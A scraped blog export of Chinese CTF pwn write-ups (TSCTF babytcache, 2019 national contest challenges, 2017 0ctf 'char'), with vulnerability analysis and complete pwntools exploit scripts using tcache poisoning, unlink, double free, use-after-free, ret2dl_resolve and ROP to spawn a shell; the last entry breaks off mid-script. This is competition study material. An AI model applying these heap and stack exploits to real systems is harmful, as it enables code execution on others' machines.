babytcache思路：这题是第一天晚上三点半拿的一血。。。因为下午一直在nofile的错误思路中挣扎搞的心情烦躁不已。。。晚上10点半开始做，十二点多才静下心。。。这个题因为pwnable.tw上那道的误导导致开始思路错误。。浪费了free()的次数。。。之后向出题的师傅要了hint，也证实了我之前思路的错误。。。之后开始尝试新的思路，在0xabcda000上构造overlapping。。。然后利用文件结构体泄露出地址。。。改malloc_hook为one_gadget，尝试了一遍发现拿不到shell，然后进行realloc微调，getshell ! ! ! ! ! (做出这题过后，又看了一小时的nofife。。。还是在错误思路里绕，四点半顶不住。。。去睡觉了orz.) exp如下:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'debug = 0if debug: p = process('./main')else: p = remote('10.112.100.47',2333)P = ELF('./main')libc = ELF('./libc-2.27.so')def new(size,payload): p.recvuntil('choice:') p.sendline('1') p.recvuntil('size:') p.sendline(str(size)) p.recvuntil('data:') p.send(payload)def delete(): p.recvuntil('choice:') p.sendline('2')p.recvuntil('secret:')p.send(p64(0)+p64(0x101)+'\x00'*0xf0+p64(0)+p64(0x21)+'\x00'*0x10+p64(0)+p64(0x21))new(0xf0,'\x01'*0xf0)delete()delete()new(0xf0,p64(0xabcda010))new(0xf0,p64(0))new(0xf0,p64(0))delete()new(0x60,'\x02'*0x60)delete()delete()new(0x60,p64(0xabcda080))new(0x60,p64(0))new(0x30,'\x60\xd7')new(0x60,p64(0))new(0x60,p64(0xfbad1800)+p64(0)*3+'\x00')p.recv(8)libcbase = u64(p.recv(8)) -(0x00007f087f0d28b0- 0x7f087ece5000 )log.success('libcbase = '+hex(libcbase))one_gadget = [0x4f2c5,0x4f322,0x10a38c]malloc_hook = libcbase + libc.sym['__malloc_hook']log.success('malloc_hook = '+hex(malloc_hook))realloc = libcbase + libc.sym['__libc_realloc']log.success('realloc = '+hex(realloc))new(0x40,p64(0))delete()delete()new(0x40,p64(malloc_hook-0x10))new(0x40,p64(0))new(0x40,p64(0)+p64(libcbase+one_gadget[0])+p64(realloc+2))#gdb.attach(p)p.recvuntil('choice:')p.sendline('1')p.recvuntil('size:')p.sendline(str(0x20))#gdb.attach(p)p.interactive()]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>TSCTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019全国大学生信息安全竞赛初赛pwn]]></title>
    <url>%2F2019%2F04%2F26%2F2019%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E9%A2%84%E8%B5%9Bpwn%2F</url>
    <content type="text"><![CDATA[前言：这次比赛很尴尬，我本来以为自己报上了名，但是结果没报上。。。只能让同学给我发题目然后自己做，没法拿flag，一共六题，只做出来四题，两题栈，两题堆，最后两题做出来的队伍个数都是16个，显然不是我这小破邮大一菜狗可以做出来的 Or2。 所有的二进制文件都在这里：题目的二进制文件 栈部分：0x1 第一天_your_pwn:0x11功能分析和漏洞寻找：首先gdb看一下题目基本信息，是64位的程序，PIE开启，NX开启，relro没开全。 放进ida看一下，在main函数里只是一些准备工作没有漏洞存在，我们进入vuln函数进一步分析： 在vuln中我们发现了程序进行了41次循环，每一次输入一个下标index，以局部变量v4为基准泄露一个字节的内容，然后再改为新的数据，漏洞点在于index没有进行大小检查，可以任意大，超出v4数组的范围到达main返回地址处，这既实现了leak又实现了change，而且有41次机会，现在思路就很明了了！！ 0x12 漏洞利用：第一步还是leak出libc，根据经验我们知道在main函数返回地址附近一般会有__libc_start_main+240出现，我们可以泄露其然后进而泄露libc，这里的libc需要我们自己查找确定，我用的是wiki上的一个工具：LibcSearcher，除了libc之外，我们还应泄露一下程序的基址，因为程序开了PIE，所以我们最后改main函数返回地址的时候要构造p64(pop_rdi_addr)+p64(sh_addr)+p64(system_addr)这个payload的时候pop_rdi_addr这个gadget需要程序基址。 main函数的rbp附近的stack分部如下图：我们可以利用画红圈的两个地方（main函数返回地址和ebp）来leak出libc和基址。 第二步就是将main的返回地址改为payload=p64(pop_rdi_addr)+p64(sh_addr)+p64(system_addr)。需要注意的是sh_addr和system可能因为libc的不同而产生一些小变化，保险起见还是直接调试看偏移最好，不要直接在libc中搜索。 0x13 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114#coding:utf-8from pwn import *from LibcSearcher import *context(os='linux',arch='amd64')#context.log_level = 'debug'p = process('./pwn')P = ELF('./pwn')p.recvuntil('name:')p.send('\x12\x12\x12\x12\x12\x12\x12\x12')ret_addr = [0 for i in range(6)]#----------------------------------------leak __libc_start_main_addr-------------------------------for i in range(6): p.recvuntil('input index\n') p.sendline(str(624+8+i)) #具体数字自己调试，之后同，只要一块对了，然后之后算偏移即可。 p.recvuntil('value(hex) ') addr = p.recv(8) if(addr[0]=='f'): addr = int(addr[6:],16) else: addr = int(addr[0:2],16) log.success('one_addr = '+hex(addr)) p.recvuntil('new value\n') p.sendline(str(addr)) ret_addr[i] = addr__libc_ret = ''for i in range(6): if(len(str(hex(ret_addr[5-i])))&lt;4): __libc_ret+= '0'+str(hex(ret_addr[5-i]))[2:] else: __libc_ret+= str(hex(ret_addr[5-i]))[2:]__libc_ret = int(__libc_ret,16)log.success('__libc_ret = '+hex(__libc_ret))#---------------------------------------leak __libc_start_main_addr success------------------------#---------------------------------------leak base_addr---------------------------------------------for i in range(6): p.recvuntil('input index\n') p.sendline(str(624+i)) p.recvuntil('value(hex) ') addr = p.recv(8) if(addr[0]=='f'): addr = int(addr[6:],16) else: addr = int(addr[0:2],16) log.success('one_addr = '+hex(addr)) p.recvuntil('new value\n') p.sendline(str(addr)) ret_addr[i] = addrpop_rdi = ''for i in range(6): if(len(str(hex(ret_addr[5-i])))&lt;4): pop_rdi+= '0'+str(hex(ret_addr[5-i]))[2:] else: pop_rdi+= str(hex(ret_addr[5-i]))[2:]#--------------------------------------leak base_addr success-----------------------------------pop_rdi = int(pop_rdi,16)pop_rdi = pop_rdi + 0x63log.success('pop_rdi_addr = '+hex(pop_rdi))#--------------------------------------gain pop_rdi_addr success---------------------------------__libc_start_main_addr = __libc_ret - 240libc = LibcSearcher('__libc_start_main',__libc_start_main_addr)libcbase = __libc_start_main_addr - libc.dump('__libc_start_main')log.success('libcbase = '+hex(libcbase))system_addr = libcbase + libc.dump('system') + 0x10 #自己调试进行调整，因为libc可能有微小差别。sh_addr = libcbase + (0xc1ed57-0xa92000) #自己调试，算偏移即可。log.success('system_addr = '+hex(system_addr))log.success('sh_addr = '+hex(sh_addr)) #-------------------------------------gain system_addr and sh_addr success-----------------------#-------------------------------------将main函数返回地址改为pop_rdi_addr为system准备参数----------for i in range(6): p.recvuntil('input index\n') p.sendline(str(624+8-288+i)) p.recvuntil('new value\n') p.sendline(str(int(str(hex(pop_rdi))[12-2*i:14-2*i],16)))for i in range(8): p.recvuntil('input index\n') p.sendline(str(624+8-288+8+i)) p.recvuntil('new value\n') if(i&lt;6): p.sendline(str(int(str(hex(sh_addr))[12-2*i:14-2*i],16))) else: p.sendline('0')for i in range(6): p.recvuntil('input index\n') p.sendline(str(624+8-288+16+i)) p.recvuntil('new value\n') p.sendline(str(int(str(hex(system_addr))[12-2*i:14-2*i],16)))for i in range(9): p.recvuntil('input index\n') p.sendline('0') p.recvuntil('new value\n') p.sendline('0')#-------------------------------success---------------------------------------------------------p.recvuntil('(yes/no)? \n')#gdb.attach(p)p.sendline('no')p.interactive() 0x14 收货：可能在数据的处理和转化方面，字符串，16进制数，十进制数之间转化和拼接拆分有点繁杂，（可能因为我对python不太熟悉），其他到没有什么太坑人的地方，一些细节问题也需要注意一下，我从下午三点开始，五点不到解出的，基本都是在处理数据之间的转化和拼接。可能还有更好的思路，我也不敢过多评说。 0x2 第二天_baby_pwn:0x21 程序分析：额。。。这一题怎么说呢，程序啥都没有，32位的，简直是ret2_dl_resolve的标准模板，直接把XDCTF 2015的pwn200的exp搬过来改改数据就行了orz，比赛的时候秒出的。。。。。 至于ret2_dl_resolve的教程在wiki上有，这篇文章也很详细：ret2_dl_resolve，我就不斗胆再说了orz，这里只分享一些我的感悟： 0x22 ret2_dl_runtime_solve 总结：需要对三个部分和函数延迟绑定技术的流程熟悉： .rel.plt节(函数重定位表)的结构体： //readelf -r typedef struct {​ Elf32_Addr r_offset; // 即got表的条目​ Elf32_Word r_info; // 很重要，为重点伪造对象。} Elf32_Rel;#define ELF32_R_SYM(info) ((info)&gt;&gt;8)#define ELF32_R_TYPE(info) ((unsigned char)(info))#define ELF32_R_INFO(sym, type) (((sym)&lt;&lt;8)+(unsigned char)(type)) .dynsym节(动态链接符号表)的结构体（其大小在32位中为0x10）：typedef struct{Elf32_Word st_name; // 函数名字符串相对于.dynstr节起始地址的偏移Elf32_Addr st_value; // Symbol valueElf32_Word st_size; // Symbol sizeunsigned char st_info; // Symbol type and bindingunsigned char st_other; // Symbol visibility under glibc&gt;=2.2Elf32_Section st_shndx; // Section index} Elf32_Sym; .dynstr节（动态链接的字符串）中储存了函数名。 //节的地址可以用readelf -S 来看。 .延迟绑定。用下图可以直观的看到。 我们需要清楚GOT[0],GOT[1],GOT[2]和PLT[0]中的内容。 我们需要做的就是在使调用函数的整个过程被我们所控制，首先劫持栈： payload+= p32(pop_rbp) + p32(mystack) + p32(leave_ret) 然后需要在栈上布置这种结构：payload = p32(mystack)payload+= p32(plt_0_addr)payload+= p32(fake_index)payload+= p32(ret_addr)payload+= p32(arguments)payload+= fake_relpayload+= fake_sympayload = payload.ljust(0x80,’\x00’)payload+= fake_str 之后我们要做的事分三步：1.伪造fake_index来使程序跳入我们自己的fake_rel结构体2.构造fake_rel的r_info来使程序跳到我们自己的fake_sym结构体 (这里需要我们自己来构造字节对齐。)3.构造fake_sym结构体的st_name来使程序跳到我们自己的fake_str字符串。其中fake_index，fake_rel，fake_sym，fake_str的地址都需要我们自己能够精确地控制。（栈注意迁移即可。） 0x23 exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#coding:utf-8from pwn import *context(os='linux',arch='i386')#context.log_level = 'debug'p = process('./pwn')P = ELF('./pwn')lr = 0x08048448bss = 0x0804aa00pppr_addr = 0x080485d9pop_ebp = 0x080485dbpayload = (0x28+4) * 'a'payload+= p32(P.plt['read'])payload+= p32(pppr_addr)payload+= p32(0)payload+= p32(bss) payload+= p32(0x400)payload+= p32(pop_ebp)payload+= p32(bss)payload+= p32(lr)p.send(payload)sleep(1)plt_0 = 0x08048380r_info = 0x107rel_plt = 0x0804833c dynsym = 0x080481dcdynstr = 0x0804827cfake_sys_addr = bss + 36align = 0x10 - ((fake_sys_addr-dynsym)&amp;0xf)fake_sys_addr = fake_sys_addr + alignindex = (fake_sys_addr - dynsym)/0x10r_info = (index &lt;&lt; 8) + 0x7st_name = (fake_sys_addr + 0x10) - dynstrfake_sys = p32(st_name) + p32(0) + p32(0) + p32(0x12) fake_rel = p32(P.got['read']) + p32(r_info)fake_rel_addr = bss + 28fake_index = fake_rel_addr - rel_plt payload = p32(bss)payload+= p32(plt_0)payload+= p32(fake_index)payload+= p32(0xdeadbeef)payload+= p32(bss+0x80)payload+= p32(0)payload+= p32(0)payload+= fake_relpayload+= 'a'*alignpayload+= fake_syspayload+= 'system'payload = payload.ljust(0x80,'\x00')payload+= '/bin/sh\x00'p.sendline(payload)p.interactive() 0x24 赛后：在群里听一些师傅说可以用其他方法，爆破syscall之类的，我也不懂orz。。。。。不过貌似ret2_dl_solve在现在的题目中很少出现了。。。。但学了总比不知道好QAQ 堆部分：(⊙o⊙)…我个人觉得这两道堆虽然都算不上难（难的话我也不可能做出来了orz），但是也都是稳中有变，还是挺有趣的，其中第一题daily漏洞点比较隐蔽，发现以后可以用double free或者unlink都行，我用unlink做到快最后的时候被一个地方卡住了（wtf &gt;_&lt;），感觉中间有点乱，就重新开始的，结果肝到最后才肝出来。第二天的是double，这一题比较顺利，两个小时不到就解出了，但是没想到他最后的分值竟然比daily高！！！（wtf 逗我????） 0x3 第一天_daily:0x31 程序分析和漏洞寻找：首先看一下程序的基本信息，为64位，PIE没开，relro为full，估计是堆题，需要改malloc_hook或者free_hook为one_gagdet的通用套路。 放进ida里进一步分析，发现程序有四个功能，add()，delete()，upgrade()，view()。 程序大致的流程就是在bss段有一个已知的地址区域存放各chunk的可用大小和堆指针（一个结构体占0x10大小），然后可以申请大小在0x100之下的chunk，可以不填满，但是没有溢出漏洞。upgrade()也没有溢出漏洞，输入的大小不能超过原先申请的大小，view()是以字符串的形式来打印chunk的内容。delete()就是通过index找到目标chunk，然后free()。 浏览一遍发现似乎没有什么漏洞点orz，于是在次仔细看了一遍，发现了在delete()中在free()的时候index没有检查，所以我们可以free()任意地址的chunk。 0x32 漏洞利用：第一步还是leak，这里我们需要思考我们需要leak出什么，libc我们肯定需要leak，因为malloc_hook或者free_hook或者one_gadget的真实地址都需要libc，其次我们还需要leak出heap的地址，因为我们要在heap里伪造chunk来进行unlink或者double free，所以必须得知道heap的地址，才能知道我们的fake_chunk的地址并把它放入伪造的chunk结构体中，进而成功free()出fake_chunk。因为要泄露libc和heap所以我们最好获取一个曾经在largebin之中的chunk的头部，所以先申请两个0x200大小的chunk，然后将它们free()，之后unsortedbin之中会出现一个0x420的chunk，然后我们再申请一个chunk的时候，根据glibc的机制，unsortedbin中的chunk会被遍历检查看有没有大小正好合适的，有的话直接分，没有的话会将所有的chunk放入对应的bins中，所以0x420的chunk被放入largebin中，所以再申请时我们得到的chunk是从largebin中切下来的fd_nextsize和bk_nextsize会被启用： 然后我们就可以通过对这个新的chunk读来泄露libc和heap地址。 leak成功后，我们可以在随便一个0x200大小（大小足够就行。）的chunk里进行unlink的构造，然后通过偏移计算index来欺骗delete()，最后unlink实现之后我们就可以将Index 4的指针改为malloc_hook的地址，然后再edit()改为one_gadget即可。。。。。但是！！！操蛋的是我不知道为什么malloc_hook行不通，我试了四个gadgets都不行，以为凉了，结果换成free_hook就成了，不知道是什么原因orz，真的神奇&gt;_&lt;………. double_free思路我就不说了，自己看exp吧，类似的。。。比unlink要简单一点。。。。 0x33 unlink思路_exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139#coding:utf-8from pwn import *#from LibcSearcher import *context(os='linux',arch='amd64')#context.log_level = 'debug'p = process('./daily')def add(size,payload): p.recvuntil('choice:') p.sendline('2') p.recvuntil('daily:') p.sendline(str(size)) p.recvuntil('daily\n') p.send(payload)def view(): p.recvuntil('choice:') p.sendline('1')def delete(index): p.recvuntil('choice:') p.sendline('4') p.recvuntil('daily:') p.sendline(str(index))def upgrade(index,payload): p.recvuntil('choice:') p.sendline('3') p.recvuntil('daily:') p.sendline(str(index)) p.recvuntil('daily\n') p.send(payload)payload = '\x66'*0x200add(len(payload),payload) #index 0add(len(payload),payload) #index 1add(len(payload),payload) #index 2add(len(payload),payload) #index 3delete(1) #delete 1delete(2) #delete 2payload = '\x12'*8add(0x1a0,payload) #index 1 size无所谓，看心情。。。#-------------------------------------------利用large chunkl来leak libcbase和heapbase---------view()p.recvuntil('\x12\x12\x12\x12\x12\x12\x12\x12')main_arena_addr = u64(p.recv(6).ljust(8,'\x00')) - (0xf68-0xb20)log.success('main_arena_addr = '+hex(main_arena_addr))libcbase = main_arena_addr - (0x4be5b20-0x4821000)log.success('libcbase = '+hex(libcbase))payload = '\x12'*12+'\x21'*4upgrade(1,payload)view()p.recvuntil('\x21\x21\x21\x21')heap_addr = u64(p.recv(4).ljust(8,'\x00')) - 0x210log.success('heap_addr = '+hex(heap_addr))#gdb.attach(p)#-----------------------------------------------leak success--------------------------------------payload = 'a'*8add(0x260,payload) #index 2 这里清空unsortedbin为了使之后的思路更清晰。#gdb.attach(p)#-----------------------------------------------prepare unlink------------------------------------payload = p64(0)payload+= p64(0xa1)payload+= p64(0)*2payload+= p64(0xa0)payload+= p64(heap_addr+0x20)payload = payload.ljust(0xa0,'\x00')payload+= p64(0x0)payload+= p64(0x91)payload+= p64(0)*2payload+= p64(0x80)payload+= p64(heap_addr+0xc0)payload = payload.ljust(0x130,'\x00')payload+= p64(0)payload+= p64(0x21)payload+= p64(0)*2payload+= p64(0)payload+= p64(0x21)upgrade(0,payload)#gdb.attach(p)index = (heap_addr + 0x30 - 0x602060)/0x10delete(index) #gdb.attach(p)payload = p64(0)add(0x90,payload) #index 4payload = p64(0)*2payload+= p64(0)payload+= p64(0x91)payload+= p64(0x6020a8-0x18)payload+= p64(0x6020a8-0x10)payload+= p64(0)*14payload+= p64(0x90)payload+= p64(0x90)payload+= p64(0)*2payload+= p64(0x80)payload+= p64(heap_addr+0xc0)payload+= p64(0)*12payload+= p64(0)payload+= p64(0x21)payload+= p64(0)*2payload+= p64(0)payload+= p64(0x21)upgrade(0,payload)#gdb.attach(p)index = (heap_addr + 0xd0 - 0x602060)/0x10delete(index)#gdb.attach(p)#-------------------------------unlink success---------------------------------------------free_hook = libcbase + (0x1728f7a8 - 0x16ec9000)log.success('free_hook = ' + hex(free_hook))payload = p64(0)*2payload+= p64(0x80)payload+= p64(free_hook)upgrade(4,payload)#gdb.attach(p)one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]upgrade(4,p64(one_gadget[1]+libcbase))#gdb.attach(p)delete(0)p.interactive() 0x35 double_free思路_exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#coding:utf-8from pwn import *#from LibcSearcher import *context(os='linux',arch='amd64')#context.log_level = 'debug'p = process('./daily')def add(size,payload): p.recvuntil('choice:') p.sendline('2') p.recvuntil('daily:') p.sendline(str(size)) p.recvuntil('daily\n') p.send(payload)def view(): p.recvuntil('choice:') p.sendline('1')def delete(index): p.recvuntil('choice:') p.sendline('4') p.recvuntil('daily:') p.sendline(str(index))def upgrade(index,payload): p.recvuntil('choice:') p.sendline('3') p.recvuntil('daily:') p.sendline(str(index)) p.recvuntil('daily\n') p.send(payload)payload = '\x66'*0x200add(len(payload),payload) #index 0add(len(payload),payload) #index 1add(len(payload),payload) #index 2add(len(payload),payload) #index 3delete(1) #delete 1delete(2) #delete 2payload = '\x12'*8add(0x1a0,payload) #index 1 #------------------------------------------------利用large chunkl来leak libcbase和heapbase---------------------------------view()p.recvuntil('\x12\x12\x12\x12\x12\x12\x12\x12')main_arena_addr = u64(p.recv(6).ljust(8,'\x00')) - (0xf68-0xb20)log.success('main_arena_addr = '+hex(main_arena_addr))libcbase = main_arena_addr - (0x4be5b20-0x4821000)log.success('libcbase = '+hex(libcbase))payload = '\x12'*12+'\x21'*4upgrade(1,payload)view()p.recvuntil('\x21\x21\x21\x21')heap_addr = u64(p.recv(4).ljust(8,'\x00')) - 0x210log.success('heap_addr = '+hex(heap_addr))#gdb.attach(p)#-----------------------------------------------leak success--------------------------------------payload = 'a'*8add(0x31,payload) #index 2 #------------------------------------------------prepare doublefree--------------------------------payload = p64(0)+p64(0x31) payload+= p64(0)*2payload+= p64(0x20)+p64(heap_addr+0x20)payload+= p64(0)+p64(0x31)payload+= p64(0)*2payload+= p64(0x20)+p64(heap_addr+0x50)payload+= p64(0)+p64(0x31)upgrade(0,payload)index = (heap_addr + 0x30 - 0x602060)/0x10delete(index)index = (heap_addr + 0x60 - 0x602060)/0x10delete(index)payload = p64(0)+p64(0x31) payload+= p64(0)*2payload+= p64(0x20)+p64(heap_addr+0x20)payload+= p64(0)+p64(0x31)upgrade(0,payload)index = (heap_addr + 0x30 - 0x602060)/0x10delete(index)#-----------------------------------------------double free success--------------------------------payload = p64(0x602078) add(0x20,payload) #index 3free_hook = libcbase + (0x1728f7a8 - 0x16ec9000)log.success('free_hook = ' + hex(free_hook))payload = p64(free_hook)add(0x20,payload) #index 4add(0x20,payload) #index 5add(0x20,payload) #index 6one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]upgrade(2,p64(one_gadget[1]+libcbase))delete(4)p.interactive() 0x36 收货：可能需要对free()的检查机制了解的比较深入才能得心应手的快速解出这一题，我第一遍因为思路不清晰导致不知道改了一个什么东西总是报错，第二遍整理一下思路才Pwn掉，挺丢人的。。。。。题目出的稳中有活，难度也适合像我这种初学者，感觉出的不错。。。。&gt;_&lt;. 0x4 第二天_double:0x41 程序功能分析：首先看一下程序的基本信息：64位，relro为paril，没开PIE，看题目的名字猜是double free….(但实际上最后我没用上double,只用了uaf来构造fake_chunk….orz) 放进ida看一下：程序是按照链表的形式表现的，之前做过一个类似的链表的题目。。。感觉比这个难一点。。首先head_ptr和prev_ptr都清零。。(这里变量我已经rename了，所以看着好理解一点，开始自己看的时候还是需要看一会) 之后程序有4个功能，new()，show()，edit()，delete()： 分析程序功能以后，new()大概功能就是在堆上申请一个chunk_header(总大小为0x20，之中储存了content的size和chunk的index，，以及自己的content的地址和上一个chunk的chunk_header的地址。)，然后先将我们的输入储存在一个缓冲区，然后比较其内容和上一个chunk的content是否一样，如果一样话，就不再用malloc()申请新的chunk，而是将其的content地址直接指向上一个chunk的content地址，若不一样的话就再malloc()一块和我们输入大小一样的chunk。 show()的功能为输入下标然后遍历chunk链表找到下标符合的chunk然后以字符串的形式打印其content内容（\x00截断） edit()的功能为输入下标然后遍历chunk链表找到下表合适的chunk然后比较我们输入的centent大小和之前的大小，若比其小则直接在原content处覆盖，若比其大则再malloc()一块chunk。 delete()的功能为输入下标然后遍历chunk链表知道下标合适的chunk然后先释放其content指针，再释放其chunk_header指针。需要注意的是这个程序是一旦delete()一个下标之后，这个下标将不再存在，下一次再申请是继续往后延伸的下标，不会找已经已经free()的小的下标。细节不要搞错了。。。 0x42 漏洞寻找：先找了一会，没有发现溢出漏洞。。。然后开始考虑 uaf 和 double free，利用glibc的机制来leak和构造fake，然后发现如果申请两个内容相同的chunk时，然后delete()其中一个，但另外一个仍然可以对已经放进bins的原先装content的那个chunk进行读写操作。。。思路开始变得清晰。。。 0x43 漏洞利用：首先我们申请一个大小范围在fastbin之外（总大小大于0x80）的chunk，然后进行uaf的读操作泄露出libc，之后再申请小的chunk，这些小的chunk和他们的chunk_header都会被分配在uaf的区域（因为其原先在unsortedbin中），然后我们可以通过uaf的写入功能更改新chunk_header的content指针为free_got的地址，并且先在堆中写入’/bin/sh\x00’，然后通过新chunk的upgrade功能将free_addr改为system_addr，然后再申请一个新的小chunk，其header应该还是在uaf区域，然后通过uaf的写入修改其content指针为‘/bin/sh\x00’字符串的地址（我们之前已经写在了堆上，所以我们需要泄露heap的地址！！方法类似，在最开始的时候申请一个大小在fastbin范围内的chunk然后进行uaf，利用uaf的读功能泄露heap地址。），最后delete()最后申请的那个chunk即可，在free(content指针)时就等于调用了system(‘/bin/sh\x00’)。 0x44 exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'p = process('./pwn')P = ELF('./pwn')def new(payload): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil('data:\n') p.sendline(payload)def edit(index,payload): p.recvuntil('&gt; ') p.sendline('3') p.recvuntil('index: ') p.sendline(str(index)) p.sendline(payload)def delete(index): p.recvuntil('&gt; ') p.sendline('4') p.recvuntil('index: ') p.sendline(str(index))def list_(index): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil('index: ') p.sendline(str(index))new('\x11'*0xf) #index 0 new('\x11'*0xf) #index 1 0和1共用content chunknew('\x22'*0x7f) #index 2new('\x22'*0x7f) #index 3 2和3共用content chunknew('\x44'*0xf) #index 4 防topchunk合并#gdb.attach(p)delete(3)#-------------------------------------leak libcbase and system_addr and heap-----------------------list_(2)main_arena_addr = u64(p.recv(6).ljust(8,'\x00')) - 88log.success('main_arena = '+hex(main_arena_addr)) libcbase = main_arena_addr - (0xdd8b20-0xa14000)log.success('libcbase = '+hex(libcbase))system_addr = libcbase + (0xbab390 - 0xb66000)log.success('system_addr = '+hex(system_addr))#gdb.attach(p)delete(1)list_(0)heap_addr = u64(p.recv(4).ljust(8,'\x00')) - 0x110log.success('heap_addr = '+hex(heap_addr))#--------------------------------------leak success------------------------------------------------new('\x55'*0xf) #index 5new('\x66'*0xf) # 6new('\x77'*0xf) # 7new('\x88'*0xf) # 8payload = '/bin/sh\x00'payload+= '\x55'*0x10payload+= p64(0x21)payload+= '\x07'+'\x00'*3+'\x0f'+'\x00'*3payload+= p64(P.got['free'])payload+= p64(heap_addr+0xf0)payload+= p64(0x21)payload+= '\x22'*0x18payload+= p64(0x31)payload+= '\x08'+'\x00'*3+'\x0f'+'\x00'*3payload+= p64(heap_addr+0x90) #“/bin/sh\x00”的地址。edit(2,payload)payload = p64(system_addr)edit(7,payload)delete(8)p.interactive() 0x45 收货：感觉挺有趣的，链表形式的题目还是很有趣，觉得无论是doublefree还是什么，对glibc的机制了如指掌才是真正的王道。。。对每一块chunk的来源和去向和他们什么时候该有什么内容都在心中清楚才能最快的找到思路并且在调试上节约时间。。。这一题最后是100p，比daily还高，可能考的堆机制的理解更深一点吧。。。。 补更：后两题记个日期：现在已经是2019年9月15日了hhhhh，强迫症想到还有两题没填坑，回去看一下。 ps：现在看预赛题真的简单。。。orz bms:emmm像个弱智题。。。服了，前面的密码过了以后，后面就是弱智题，五分钟解决。 exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#coding:utf-8from pwn import *path = './pwn'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['tmux','split','-h'],timeout = 0.1)#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(size,content): p.recvuntil('&gt;\n') p.sendline('1') p.recvuntil('name') p.send('\x00'*0x10) p.recvuntil('size:') p.sendline(str(size)) p.recvuntil('tion:') p.send(content)def delete(index): p.recvuntil('&gt;\n') p.sendline('2') p.recvuntil('index:') p.sendline(str(index))p.recvuntil('name:')p.sendline('admin')p.recvuntil('word:')p.sendline('frame')new(0x30,'\x00'*0x30) #0delete(0)delete(0)stdout = 0x602020new(0x30,p64(stdout)) #1new(0x30,'\x00'*0x30) #2new(0x30,'\x60') #3payload = p64(0xfbad1800) + p64(0)*3 + '\x00'new(0x30,payload) #4p.recv(8)libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f55658d58b0 - 0x7f55654e8000)log.success('libcbase = '+hex(libcbase))new(0x40,'\x00'*0x40) #5delete(5)delete(5)new(0x40,p64(libcbase+libc.sym['__free_hook'])) #6new(0x40,'/bin/sh\x00'+'\x00'*0x28) #7new(0x40,p64(libcbase+libc.sym['system'])) #8delete(7)if attach == 1: gdb.attach(p)p.interactive() Virtual:exp如下：12]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017-0ctf-char-writeup]]></title>
    <url>%2F2019%2F04%2F13%2F2017-0ctf-char-writeup%2F</url>
    <content type="text"><![CDATA[首先提供题目的二进制文件2017-0ctf-char。 预览：拿到题目先预览，发现程序为32位且保护很少，估计应该是栈题，运行一下发现程序似乎很简单。。。放进ida看一下反汇编码，发现程序确实不难，但是有几个需要注意的地方。 我们可以看到程序将libc通过mmap()映射到了固定的0x5555e000处，这等于我们不需要泄露libc就可以确定函数和gadgets的真实地址，带来了极大的方便。比较麻烦的是程序有一个check的函数，检查每个字符必须为可见字符（16进制的大小范围为0x1f~0x7e）,但我们又发现，他的v1是由strlen()确定的，我们可以通过scanf()只看空格和回车结束来输入’\x00’使其提前结束。。。。。但我们又发现了一个问题。。。就是在漏洞函数中我们的strcpy也是通过’\x00’来判断的。这就很让人蛋疼。。。。这就是说我们通过strcpy()复制到漏洞点的字符串就是我们截断前的那一小段。。。。 漏洞寻找和分析：很明显有一个漏洞函数，通过strcpy()造成溢出。这个不难发现，难点在于check()给我们的rop链造成了很大的障碍。check的存在注定我们复制到溢出点的数据长度不可能太长，但无论我们是调用函数并且给函数准备参数还是gadgets都需要占用不少的位置，这几乎是不可能成功的。如下图可见一点： system()和execve()都过不了检查。。。我们能想到的就是我们必须在小的溢出数据范围内调用一些gadgets而使esp迁移到main的栈数据区域(我们的复制源)，而不能在漏洞函数里卡死，迁移到源数据后这题就变得很简单。难点在于gadgets的合适选择和寻找。 漏洞利用：我是通过观察strcpy()之后发现ecx似乎一直指在源数据的中间固定区域（相对偏移不变），所以想到使ecx的值赋给esp使esp直接跳转，但是通过搜索gadgets发现只能通过 mov eax,ecx; ret; xchg eax,esp; ret b; 来实现紧接着再通过具体的细节调整使跳转过后的esp指向addr_pop_ebx为int 0x80准备参数，准备调用execve(‘/bin/sh’,0,0)。具体细节还得自己验证。 exp如下：(调用函数实现的就不写了，请自己调试尝试)12345678910111213141516171819202122232425262728293031323334353637383940414243#coding:utf-8from pwn import *p = process('./char')context(os='linux',arch='i386')#context.log_level = 'debug'p.recvuntil('GO : ) \n')base = 0x5555e000sh_addr = 0x15D7EC#pop_ebx = 0x109D07 xor_eax_pop_ebx = 0x7dce9pop_ecx = 0xcae3bpop_edx = 0x1a9eint_0x80 = 0x2df35inc_eax = 0x26a9bnop_xor_eax = 0x7403axchg_eax_esp_retb = 0xe6d62mov_eax_ecx = 